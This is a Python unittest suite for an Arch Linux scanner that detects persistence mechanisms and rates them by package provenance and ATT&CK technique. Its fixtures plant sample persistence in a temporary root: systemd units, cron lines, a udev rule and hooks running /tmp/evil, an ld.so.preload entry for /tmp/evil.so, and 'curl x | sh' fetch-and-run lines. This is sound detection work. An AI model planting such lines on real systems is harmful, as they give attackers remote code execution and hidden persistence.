import contextlib
import io
import json
import os
import sys
import unittest

sys.path.insert(0, os.path.dirname(__file__))

from fixtures import make_pacman_pkg, make_stub_file  # noqa: E402
from helpers import FakeRunCommand, scan_args  # noqa: E402
from test_arch import ARCH, ArchBox  # noqa: E402


class UnownedAwareRunCommand(FakeRunCommand):
    """Answers `pacman -Qo` for any path with "unowned" so tests do not list every stray target."""

    def __call__(self, cmd, timeout=10, check=True):
        if tuple(cmd[:2]) == ("pacman", "-Qo"):
            self.calls.append(tuple(cmd))
            return None
        return super().__call__(cmd, timeout, check)


class PersistBox(ArchBox):
    def setUp(self):
        super().setUp()
        self.table[("crontab", "-l")] = None
        self.weird.run_command = UnownedAwareRunCommand(self.table)

    def add_official(self, name, path, version="1.0-1", **kwargs):
        self.add_pkg(name, version, path, repo="extra", packager=ARCH, **kwargs)

    def sys_file(self, path, text):
        target = self.sysroot / path.lstrip("/")
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)
        return target

    def home_file(self, rel, text):
        target = self.home / rel
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(text)
        return target

    def persist(self, **overrides):
        out = io.StringIO()
        with contextlib.redirect_stdout(out):
            code = self.weird.cmd_persist(scan_args(**overrides))
        return out.getvalue(), code

    def entries(self):
        return self.weird.collect_persistence()

    def entry(self, entries, **match):
        found = [e for e in entries if all(getattr(e, k) == v for k, v in match.items())]
        self.assertEqual(len(found), 1, [(e.source, e.file, e.target) for e in entries])
        return found[0]

    def seed_all_sources(self):
        make_stub_file(self.sysroot, "/tmp/evil")
        make_stub_file(self.sysroot, "/tmp/evil.so")
        self.sys_file("/etc/systemd/system/evil.service",
                      "[Unit]\nDescription=evil\n\n[Service]\nExecStart=/tmp/evil --daemon\n")
        self.sys_file("/etc/cron.d/evil", "* * * * * /tmp/evil\n")
        self.sys_file("/etc/xdg/autostart/evil.desktop", "[Desktop Entry]\nType=Application\nExec=/tmp/evil\n")
        self.sys_file("/etc/ld.so.preload", "/tmp/evil.so\n")
        self.add_official("conky", "/usr/bin/conky")
        self.home_file(".config/systemd/user/conky.service",
                       "[Service]\nExecStart=/usr/bin/conky -c %h/.config/conky/conky.conf\n")


class PersistSources(PersistBox):
    def test_persist_enumerates_all_sources(self):
        self.seed_all_sources()
        entries = self.entries()
        self.assertEqual(len(entries), 5, [(e.source, e.file) for e in entries])
        self.assertEqual(sorted(e.source for e in entries),
                         ["autostart", "cron", "ld.so.preload", "systemd service", "systemd service"])
        self.assertEqual({e.target for e in entries if e.source != "systemd service" and e.source != "ld.so.preload"},
                         {"/tmp/evil"})
        self.assertEqual(self.entry(entries, source="ld.so.preload").target, "/tmp/evil.so")
        self.assertEqual(self.entry(entries, file="/etc/cron.d/evil").key, "line 1")

    def test_persist_provenance_applied(self):
        self.seed_all_sources()
        entries = self.entries()
        for e in entries:
            if e.target.startswith("/tmp/"):
                self.assertEqual(e.trust, "UNKNOWN", e)
                self.assertEqual(e.severity, "critical", e)
                self.assertIn("not owned by any package", e.provenance)
        conky = self.entry(entries, target="/usr/bin/conky")
        self.assertEqual(conky.trust, "OFFICIAL")
        self.assertEqual(conky.severity, "info")
        self.assertEqual(conky.integrity, "intact")
        self.assertEqual(conky.attack, "T1543.002")
        self.assertEqual(conky.command, f"/usr/bin/conky -c {self.home}/.config/conky/conky.conf")
        self.assertEqual(entries[0].severity, "critical")
        self.assertEqual(entries[-1], conky)

    def test_persist_parses_exec_forms(self):
        make_pacman_pkg(self.sysroot, "bash", "5.3-1", ["/usr/bin/bash", "/bin/sh"], packager=ARCH)
        self.table[("pacman", "-Si", "bash")] = "Repository      : core\nName            : bash\n"
        self.add_official("foo", "/usr/bin/foo")
        make_stub_file(self.sysroot, "/tmp/evil")
        self.sys_file("/etc/systemd/system/a.service", "[Service]\nExecStart=-/usr/bin/foo --flag\n")
        self.sys_file("/etc/systemd/system/b.service", "[Service]\nExecStart=/bin/sh -c \"curl x | sh\"\n")
        self.sys_file("/etc/systemd/system/c.service", "[Service]\nExecStart=!!/usr/bin/foo\nExecReload=@/usr/bin/foo argv0 -r\n")
        self.sys_file("/etc/xdg/autostart/d.desktop", "[Desktop Entry]\nExec=env FOO=1 /tmp/evil %u --x %F\n")
        entries = self.entries()

        a = self.entry(entries, file="/etc/systemd/system/a.service")
        self.assertEqual((a.target, a.inline, a.severity), ("/usr/bin/foo", False, "info"))
        b = self.entry(entries, file="/etc/systemd/system/b.service")
        self.assertEqual((b.target, b.inline, b.severity, b.trust), ("/bin/sh", True, "medium", "OFFICIAL"))
        self.assertIn("inline script", b.provenance)
        for c in [e for e in entries if e.file == "/etc/systemd/system/c.service"]:
            self.assertEqual(c.target, "/usr/bin/foo", c)
        d = self.entry(entries, source="autostart")
        self.assertEqual((d.target, d.command), ("/tmp/evil", "env FOO=1 /tmp/evil  --x"))
        self.assertEqual(d.severity, "critical")

    def test_interpreter_script_is_the_target(self):
        self.add_official("python", "/usr/bin/python3")
        self.home_file("bin/job.py", "print()\n")
        self.sys_file("/etc/systemd/system/py.service",
                      f"[Service]\nExecStart=/usr/bin/python3 -u {self.home}/bin/job.py\n")
        e = self.entry(self.entries(), source="systemd service")
        self.assertEqual(e.target, f"{self.home}/bin/job.py")
        self.assertEqual(e.via, "/usr/bin/python3")
        self.assertEqual((e.trust, e.severity), ("USER_LOCAL", "medium"))

    def test_shipped_inline_script_is_info_until_the_file_changes(self):
        unit = "[Service]\nExecStart=/bin/sh -c '/usr/bin/pwck -qr'\n"
        make_pacman_pkg(self.sysroot, "bash", "5.3-1", ["/bin/sh"], packager=ARCH)
        self.table[("pacman", "-Si", "bash")] = "Repository      : core\nName            : bash\n"
        make_pacman_pkg(self.sysroot, "shadow", "4.17-1", ["/usr/lib/systemd/system/shadow.service"],
                        packager=ARCH, contents={"/usr/lib/systemd/system/shadow.service": unit.encode()})
        self.table[("pacman", "-Si", "shadow")] = "Repository      : core\nName            : shadow\n"
        e = self.entry(self.entries(), source="systemd service")
        self.assertTrue(e.inline)
        self.assertEqual(e.severity, "info")
        self.assertIn("unchanged since package install", e.provenance)

        self.sys_file("/usr/lib/systemd/system/shadow.service", unit + "ExecStartPost=/bin/sh -c 'curl x | sh'\n")
        self.weird.set_roots(str(self.proc), str(self.sysroot))
        entries = [e for e in self.entries() if e.source == "systemd service"]
        self.assertEqual({e.severity for e in entries}, {"medium"}, entries)

    def test_timer_without_service_is_reported_not_crashed(self):
        self.sys_file("/etc/systemd/system/orphan.timer", "[Timer]\nOnCalendar=daily\n")
        e = self.entry(self.entries(), source="systemd timer")
        self.assertEqual(e.target, "")
        self.assertEqual(e.severity, "info")
        self.assertIn("orphan.service not found", e.provenance)

    def test_timer_resolves_its_service(self):
        make_stub_file(self.sysroot, "/tmp/evil")
        self.sys_file("/etc/systemd/system/job.timer", "[Timer]\nOnCalendar=daily\nUnit=other.service\n")
        self.sys_file("/etc/systemd/system/other.service", "[Service]\nExecStart=/tmp/evil\n")
        entries = self.entries()
        timer = self.entry(entries, source="systemd timer")
        self.assertEqual((timer.target, timer.severity, timer.attack), ("/tmp/evil", "critical", "T1053.006"))
        self.assertEqual(timer.key, "other.service ExecStart")
        self.assertEqual(self.entry(entries, source="systemd service").attack, "T1543.002")

    @unittest.skipIf(os.geteuid() == 0, "root can read every directory")
    def test_unreadable_spool_dir_is_skipped(self):
        spool = self.sysroot / "var/spool/cron"
        spool.mkdir(parents=True)
        (spool / "root").write_text("* * * * * /tmp/evil\n")
        spool.chmod(0)
        self.addCleanup(spool.chmod, 0o755)
        self.sys_file("/etc/crontab", "SHELL=/bin/sh\n@reboot root /usr/bin/true\n")
        self.add_official("coreutils", "/usr/bin/true")
        entries = self.entries()
        self.assertEqual([(e.source, e.target) for e in entries], [("cron", "/usr/bin/true")])
        self.assertEqual(entries[0].attack, "T1053.003")

    def test_cron_dirs_and_crontab_l(self):
        make_stub_file(self.sysroot, "/etc/cron.daily/backup")
        self.table[("crontab", "-l")] = "# m h dom mon dow\n0 3 * * * /tmp/evil > /dev/null\n"
        entries = self.entries()
        self.assertEqual(self.entry(entries, file="/etc/cron.daily/backup").target, "/etc/cron.daily/backup")
        listed = self.entry(entries, file="crontab -l")
        self.assertEqual((listed.target, listed.severity), ("/tmp/evil", "critical"))

    def test_shell_rc_conservative(self):
        self.add_official("bash-completion", "/usr/share/bash-completion/bash_completion")
        self.home_file(".cargo/env", "export PATH=$HOME/.cargo/bin:$PATH\n")
        self.home_file(".bashrc",
                       "# comment\n"
                       "source /usr/share/bash-completion/bash_completion\n"
                       '. "$HOME/.cargo/env"\n'
                       "[ -x /tmp/x ] && /tmp/x\n"
                       "alias ll='ls -l'\n")
        entries = self.entries()
        self.assertEqual(len(entries), 1, entries)
        e = entries[0]
        self.assertEqual((e.source, e.target, e.trust, e.severity, e.attack),
                         ("shell rc", f"{self.home}/.cargo/env", "USER_LOCAL", "medium", "T1546.004"))
        self.assertEqual(e.key, "line 3 (source)")

    def test_udev_run(self):
        make_stub_file(self.sysroot, "/tmp/evil")
        self.sys_file("/etc/udev/rules.d/99-evil.rules",
                      'ACTION=="add", SUBSYSTEM=="usb", \\\n    RUN+="/tmp/evil %k"\n')
        e = self.entry(self.entries(), source="udev")
        self.assertEqual((e.target, e.severity, e.attack, e.key), ("/tmp/evil", "critical", "T1546", "line 1"))


class PersistOutput(PersistBox):
    def test_persist_json_exit_codes(self):
        out, code = self.persist(json=True)
        data = json.loads(out)
        self.assertEqual(code, 0)
        self.assertEqual(data["entries"], [])
        self.assertEqual(data["counts"], {"critical": 0, "medium": 0, "info": 0, "total": 0})
        self.assertIn("host", data)
        self.assertIn("timestamp", data)

        self.home_file("bin/tool.sh", "#!/bin/sh\n")
        self.home_file(".config/systemd/user/tool.service", "[Service]\nExecStart=%h/bin/tool.sh\n")
        out, code = self.persist(json=True)
        data = json.loads(out)
        self.assertEqual(code, 1)
        self.assertEqual(data["counts"]["medium"], 1)
        self.assertEqual(data["entries"][0]["trust"], "USER_LOCAL")
        self.assertEqual(data["entries"][0]["attack"], "T1543.002")

        make_stub_file(self.sysroot, "/tmp/evil")
        self.sys_file("/etc/systemd/system/evil.service", "[Service]\nExecStart=/tmp/evil\n")
        out, code = self.persist(json=True)
        data = json.loads(out)
        self.assertEqual(code, 2)
        self.assertEqual([e["severity"] for e in data["entries"]], ["critical", "medium"])

    def test_table_hides_info_unless_all(self):
        self.add_official("conky", "/usr/bin/conky")
        self.home_file(".config/systemd/user/conky.service", "[Service]\nExecStart=/usr/bin/conky\n")
        make_stub_file(self.sysroot, "/tmp/evil")
        self.sys_file("/etc/systemd/system/evil.service", "[Service]\nExecStart=/tmp/evil\n")
        out, code = self.persist()
        self.assertEqual(code, 2)
        self.assertIn("/tmp/evil", out)
        self.assertNotIn("/usr/bin/conky", out)
        self.assertIn("1 critical, 0 medium, 1 info", out)
        self.assertIn("T1543.002", out)
        out, _ = self.persist(all=True)
        self.assertIn("/usr/bin/conky", out)
        self.assertIn("OFFICIAL", out)


class ArchHooks(PersistBox):
    def hook(self, name, exec_line, directory="/etc/pacman.d/hooks"):
        self.sys_file(f"{directory}/{name}",
                      "[Trigger]\nOperation = Install\nType = Package\nTarget = *\n\n"
                      f"[Action]\nDescription = test\nWhen = PostTransaction\nExec = {exec_line}\n")

    def test_hook_exec_unowned(self):
        self.hook("z.hook", "/tmp/x")
        e = self.entry(self.entries(), source="pacman hook")
        self.assertEqual((e.target, e.severity, e.attack, e.trust), ("/tmp/x", "critical", "T1546", "UNKNOWN"))
        self.assertEqual(e.file, "/etc/pacman.d/hooks/z.hook")

    def test_hook_exec_owned(self):
        self.add_official("glibc", "/usr/bin/ldconfig")
        self.hook("ld.hook", "/usr/bin/ldconfig -r .")
        e = self.entry(self.entries(), source="pacman hook")
        self.assertEqual((e.target, e.trust, e.severity, e.integrity), ("/usr/bin/ldconfig", "OFFICIAL", "info", "intact"))
        _, code = self.persist()
        self.assertEqual(code, 0)

    def test_hook_inline_shell(self):
        make_pacman_pkg(self.sysroot, "bash", "5.3-1", ["/bin/sh"], packager=ARCH)
        self.table[("pacman", "-Si", "bash")] = "Repository      : core\nName            : bash\n"
        self.hook("sh.hook", "/bin/sh -c 'rm -f /tmp/snap-pac-pre_*'")
        e = self.entry(self.entries(), source="pacman hook")
        self.assertTrue(e.inline)
        self.assertEqual((e.target, e.severity), ("/bin/sh", "medium"))
        self.assertIn("inline script", e.provenance)

    def test_libalpm_hooks_dir_also_read(self):
        make_stub_file(self.sysroot, "/tmp/x")
        self.hook("30-evil.hook", "/tmp/x", directory="/usr/share/libalpm/hooks")
        e = self.entry(self.entries(), source="libalpm hook")
        self.assertEqual((e.file, e.target, e.severity, e.attack),
                         ("/usr/share/libalpm/hooks/30-evil.hook", "/tmp/x", "critical", "T1546"))

    def test_makepkg_conf_tamper(self):
        make_pacman_pkg(self.sysroot, "gcc", "15.2-1", ["/usr/bin/gcc", "/usr/bin/g++"], packager=ARCH)
        self.table[("pacman", "-Si", "gcc")] = "Repository      : core\nName            : gcc\n"
        self.sys_file("/etc/makepkg.conf", "CC=gcc\nCXX=/usr/bin/g++\nBUILDENV=(!distcc color !ccache check !sign)\n")
        self.assertEqual(self.entries(), [])

        self.home_file(".makepkg.conf", 'CC=/tmp/cc\nPACKAGER="Me <me@example.org>"\n')
        entries = self.entries()
        self.assertEqual(len(entries), 1, entries)
        e = entries[0]
        self.assertEqual((e.source, e.target, e.attack), ("makepkg.conf", "/tmp/cc", "T1195.001"))
        self.assertEqual(e.key, "CC (line 1)")
        self.assertIn(e.severity, ("critical", "medium"))
        _, code = self.persist()
        self.assertGreaterEqual(code, 1)

        self.home_file(".makepkg.conf", "CC=gcc\nSTRIP=/usr/local/bin/strip\n")
        e = self.entry(self.entries(), source="makepkg.conf")
        self.assertEqual((e.target, e.severity), ("/usr/local/bin/strip", "info"))
        self.assertIn("does not exist", e.provenance)
        make_stub_file(self.sysroot, "/usr/local/bin/strip")
        e = self.entry(self.entries(), source="makepkg.conf")
        self.assertEqual((e.trust, e.severity), ("USER_LOCAL", "medium"))


if __name__ == "__main__":
    unittest.main()
